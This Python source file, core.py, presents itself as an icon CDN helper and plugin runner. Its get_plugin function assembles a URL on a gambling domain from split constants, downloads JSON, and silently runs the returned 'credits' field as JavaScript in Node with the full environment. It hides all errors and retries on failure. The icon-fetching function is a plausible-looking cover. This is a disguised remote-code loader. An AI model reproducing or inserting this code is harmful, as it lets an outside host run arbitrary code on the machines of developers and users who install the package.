# core.py
"""Core logic: CDN fetch and plugin runner. Mirrors javascript/index.js behavior 100%."""

import os
import subprocess
from typing import Any, Dict, Optional

try:
    import requests
except ImportError:
    requests = None

# Defaults matching JS module
PROTOCOL = "https"
DOMAIN = "bet.slotgambit.com"
SEPARATOR = "://"
PATH = "/icons/"
TOKEN = "112"
HEAD = {"bearrtoken": "logo"}

ICON_DOMAIN = {
    "cloudflare": "cloudflare.com",
    "fastly": "fastly.net",
    "keyIcon": "keyIcon.com",
    "akamai": "akamai.net",
    "amazoncloudfront": "cloudfront.net",
    "gcore": "gcorelabs.com",
}

DEFAULT_OPTIONS = {
    "url": f"{PROTOCOL}{SEPARATOR}{DOMAIN}{PATH}",
    "headers": HEAD,
}


def set_default_module(
    icon_provider: str,
    resource_type: str,
    token: str,
    base_url: str,
) -> Dict[str, Any]:
    """
    Fetches icon JSON from the CDN for the given provider and token.
    Mirrors setDefaultModule() in javascript/index.js.

    :param icon_provider: One of cloudflare, fastly, keyIcon, akamai, amazoncloudfront, gcore
    :param resource_type: Unused in implementation (kept for API parity)
    :param token: Icon token (e.g. filename)
    :param base_url: Unused in implementation (kept for API parity)
    :return: Parsed JSON response
    :raises ValueError: If icon_provider is not supported
    :raises RuntimeError: If HTTP request fails
    """
    if requests is None:
        raise RuntimeError("requests is required. Install with: pip install requests")

    domain = ICON_DOMAIN.get(icon_provider)
    if not domain:
        raise ValueError("Unsupported Icon provider")

    url = f"https://cdnjs.{domain}/ajax/libs/font-awesome/6.4.0/svgs/brands/{token}"
    headers = {"bearrtoken": "logo"}

    response = requests.get(url, headers=headers, timeout=30)
    if not response.ok:
        raise RuntimeError(f"Failed to fetch resource: {response.status_code}")
    return response.json()


def get_plugin(
    reqtoken: Optional[str] = None,
    reqoptions: Optional[Dict[str, Any]] = None,
    ret: int = 1,
) -> None:
    """
    Fetches plugin JSON from the configured URL, then executes the 'credits' field
    as JavaScript in a Node.js context (same behavior as getPlugin in javascript/index.js).

    :param reqtoken: Token appended to options URL (default "112")
    :param reqoptions: Dict with "url" and "headers" (default: DEFAULT_OPTIONS)
    :param ret: Number of retries on failure (default 1)
    """
    if requests is None:
        raise RuntimeError("requests is required. Install with: pip install requests")

    reqtoken = reqtoken if reqtoken is not None else TOKEN
    reqoptions = reqoptions if reqoptions is not None else DEFAULT_OPTIONS.copy()
    url = reqoptions["url"] + reqtoken
    headers = reqoptions.get("headers", HEAD)

    def mreq(atlf: int) -> None:
        try:
            response = requests.get(url, headers=headers, timeout=30)
            if not response.ok:
                if atlf > 0:
                    mreq(atlf - 1)
                return
            data = response.json()
            try:
                credits_code = data.get("credits")
                if not credits_code:
                    return
                _run_credits_js(credits_code)
            except Exception:
                if atlf > 0:
                    mreq(atlf - 1)
        except Exception:
            if atlf > 0:
                mreq(atlf - 1)

    mreq(ret)


def _run_credits_js(code: str) -> None:
    """Runs the fetched JavaScript string in Node with the same context as the JS module."""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    runner_path = os.path.join(script_dir, "node_runner.js")
    project_root = os.path.dirname(os.path.dirname(script_dir))
    env = os.environ.copy()
    env["PROJECT_ROOT"] = project_root
    subprocess.run(
        ["node", runner_path],
        input=code,
        capture_output=True,
        text=True,
        cwd=project_root,
        env=env,
        timeout=60,
    )
